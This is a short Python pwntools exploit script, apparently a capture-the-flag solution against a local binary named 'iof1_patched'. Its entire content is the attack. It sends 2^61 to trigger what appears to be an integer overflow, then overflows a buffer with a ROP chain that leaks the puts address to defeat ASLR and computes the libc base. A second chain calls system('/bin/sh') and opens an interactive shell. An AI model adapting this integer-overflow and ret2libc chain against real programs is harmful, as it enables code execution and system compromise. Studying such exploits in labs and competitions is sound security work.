#!/usr/bin/env python3

from pwn import *

exe = ELF("./iof1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

p = process(exe.path) 
p.sendlineafter(b'> ',b'2305843009213693952')

pop_rdi = 0x00000000004013e3 
payload = b'A'*40 +  p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
p.sendlineafter(b'Enter your secret: ',payload) 
leak = p.readline()[:-1]
leak = u64(leak.ljust(8,b'\00'))

libc.address = leak - 492448 
p.sendlineafter(b'> ',b'2305843009213693952')

payload = b'A'*40 + p64(pop_rdi)+ p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']) 
p.sendlineafter(b'Enter your secret: ',payload) 
p.interactive() 

